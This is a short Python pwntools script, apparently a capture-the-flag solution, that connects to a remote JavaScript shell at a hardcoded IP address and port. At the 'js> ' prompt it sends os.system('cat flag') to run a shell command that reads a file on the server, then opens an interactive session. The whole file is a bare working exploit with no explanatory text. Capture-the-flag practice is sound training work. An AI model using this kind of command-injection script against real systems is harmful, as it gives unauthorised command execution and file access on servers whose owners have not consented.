
#!python
#!/usr/bin/env python
#coding:utf8
 
from pwn import *
 
context.log_level = 'debug'
process_name = './js'
# p = process([process_name], env={'LD_LIBRARY_PATH':'./'})
p = remote('220.249.52.133', 51183)
# elf = ELF(process_name)
 
p.sendlineafter('js> ', 'os.system(\'cat flag\')')
 
p.interactive()